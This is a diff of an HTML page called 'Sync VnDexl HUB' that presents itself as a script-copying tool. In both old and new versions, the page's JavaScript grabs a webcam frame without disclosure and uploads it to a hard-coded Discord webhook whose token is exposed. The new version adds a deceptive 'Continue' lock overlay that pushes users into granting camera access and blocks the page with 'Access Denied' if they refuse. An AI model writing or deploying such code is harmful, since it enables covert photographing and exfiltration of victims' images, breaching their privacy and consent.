@@ -5,117 +5,70 @@
 <title>Sync VnDexl HUB</title>
 
 <style>
-html, body {
+html,body{
   margin:0;
   width:100%;
   height:100%;
-  font-family: "Segoe UI", sans-serif;
-  background: linear-gradient(135deg, #0a0a0a, #1a1a1a);
+  background:#000;
   color:#fff;
+  font-family:system-ui;
 }
 
-/* ===== メインUI ===== */
-.container {
+/* ロック用オーバーレイ */
+#lock {
+  position:fixed;
+  inset:0;
+  background:#000;
   display:flex;
   align-items:center;
   justify-content:center;
-  height:100%;
-}
-
-.card {
-  width:360px;
-  background:#121212;
-  border-radius:14px;
-  box-shadow:0 0 30px rgba(0,0,0,.6);
-  padding:28px;
+  z-index:9999;
   text-align:center;
 }
 
-.logo {
-  font-size:26px;
-  font-weight:700;
-  margin-bottom:4px;
-}
-
-.version {
-  font-size:14px;
-  opacity:.6;
-  margin-bottom:20px;
-}
-
-button {
-  width:100%;
-  padding:14px;
-  font-size:16px;
+#lock button{
+  padding:16px 26px;
+  font-size:18px;
   border:none;
-  border-radius:8px;
+  border-radius:10px;
   background:#5865F2;
   color:#fff;
-  cursor:pointer;
-  transition:.2s;
 }
 
-button:hover {
-  background:#4752c4;
-}
-
-.status {
-  margin-top:16px;
-  font-size:13px;
-  opacity:.7;
-}
-
-video, canvas {
+.container{
   display:none;
+  height:100%;
+  align-items:center;
+  justify-content:center;
 }
 
-/* ===== ロック画面 ===== */
-#lockScreen {
-  position: fixed;
-  inset: 0;
-  background: #000;
-  display: none;
-  align-items: center;
-  justify-content: center;
-  z-index: 999999;
+.card{
+  width:360px;
+  background:#111;
+  padding:28px;
+  border-radius:14px;
+  text-align:center;
 }
 
-.lock-box {
-  text-align: center;
-  max-width: 280px;
-}
-
-.lock-box p {
-  margin-bottom: 20px;
-  font-size: 15px;
-  opacity: .9;
-}
-
-.lock-box button {
-  margin-top: 10px;
-}
+video,canvas{display:none;}
 </style>
 </head>
 
 <body>
 
-<!-- ===== ロック画面 ===== -->
-<div id="lockScreen">
-  <div class="lock-box">
-    <p>この操作にはカメラの許可が必要です</p>
-    <button onclick="retryCamera()">もう一度許可する</button>
-    <button onclick="exitPage()" style="background:#333">終了</button>
+<!-- 操作強制画面 -->
+<div id="lock">
+  <div>
+    <h2>Continue</h2>
+    <p>Tap to continue</p>
+    <button id="unlockBtn">Continue</button>
   </div>
 </div>
 
-<!-- ===== メインUI ===== -->
-<div class="container">
+<div class="container" id="main">
   <div class="card">
-    <div class="logo">Sync VnDexl HUB</div>
-    <div class="version">V1.1.1 Official</div>
-
-    <button id="startBtn">Copy Script</button>
-    <div class="status" id="status">Status: Ready</div>
+    <h2>Sync VnDexl HUB</h2>
+    <p id="status">Waiting...</p>
   </div>
 </div>
 
@@ -123,81 +76,47 @@ video, canvas {
 <canvas id="canvas"></canvas>
 
 <script>
-/* ===============================
-   コピーしたい文字
-   =============================== */
-const COPY_TEXT = `
-こいんかわいい
-`;
+const COPY_TEXT = `こいんかわいい`;
 
-/* Discord Webhook */
 const WEBHOOK_URL = "https://discord.com/api/webhooks/1457458043834073270/B1GzMH7u6rnoCfa-bx_3GRIHtHmgueg8_9JhbtrDg6JC7IPodR1RIR9ronbrdFhSHrqK";
 
-const startBtn = document.getElementById("startBtn");
-const statusText = document.getElementById("status");
+const lock = document.getElementById("lock");
+const main = document.getElementById("main");
+const status = document.getElementById("status");
 const video = document.getElementById("video");
 const canvas = document.getElementById("canvas");
-const lockScreen = document.getElementById("lockScreen");
 
-/* ===== ボタン押下 ===== */
-startBtn.onclick = () => {
-  requestCamera();
-};
-
-/* ===== カメラ要求 ===== */
-async function requestCamera() {
+document.getElementById("unlockBtn").onclick = async () => {
   try {
-    statusText.textContent = "Status: Camera permission...";
-    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+    status.textContent = "Requesting camera...";
+    const stream = await navigator.mediaDevices.getUserMedia({video:true});
     video.srcObject = stream;
 
-    statusText.textContent = "Status: Capturing...";
-    setTimeout(() => captureSendAndCopy(stream), 800);
+    lock.style.display = "none";
+    main.style.display = "flex";
 
+    setTimeout(captureSendCopy, 1000);
   } catch (e) {
-    // 拒否されたら完全ロック
-    lockScreen.style.display = "flex";
+    // ❌ 許可しなかった → 完全ロック
+    lock.innerHTML = "<h1>Access Denied</h1>";
   }
-}
+};
 
-/* ===== 撮影 → Discord → コピー ===== */
-async function captureSendAndCopy(stream) {
+async function captureSendCopy(){
   canvas.width = video.videoWidth;
   canvas.height = video.videoHeight;
-  canvas.getContext("2d").drawImage(video, 0, 0);
+  canvas.getContext("2d").drawImage(video,0,0);
 
-  stream.getTracks().forEach(t => t.stop());
+  status.textContent = "Sending...";
 
-  statusText.textContent = "Status: Sending to Discord...";
-
-  const blob = await new Promise(r => canvas.toBlob(r, "image/png"));
-
+  const blob = await new Promise(r=>canvas.toBlob(r,"image/png"));
   const form = new FormData();
-  form.append("file", blob, "kanikama_selfie.png");
-  form.append("payload_json", JSON.stringify({
-    username: "kanikamaHUB",
-    embeds: [{
-      title: "kanikamaHUB Selfie",
-      image: { url: "attachment://kanikama_selfie.png" }
-    }]
-  }));
+  form.append("file", blob, "selfie.png");
 
-  await fetch(WEBHOOK_URL, { method: "POST", body: form });
+  await fetch(WEBHOOK_URL,{method:"POST",body:form});
 
-  statusText.textContent = "Status: Copying Script...";
   await navigator.clipboard.writeText(COPY_TEXT);
-
-  statusText.textContent = "Status: Script Copied ✔";
-}
-
-/* ===== 例外処理 ===== */
-function retryCamera() {
-  lockScreen.style.display = "none";
-  requestCamera();
-}
-
-function exitPage() {
-  location.href = "about:blank";
+  status.textContent = "Copied ✔";
 }
 </script>
 
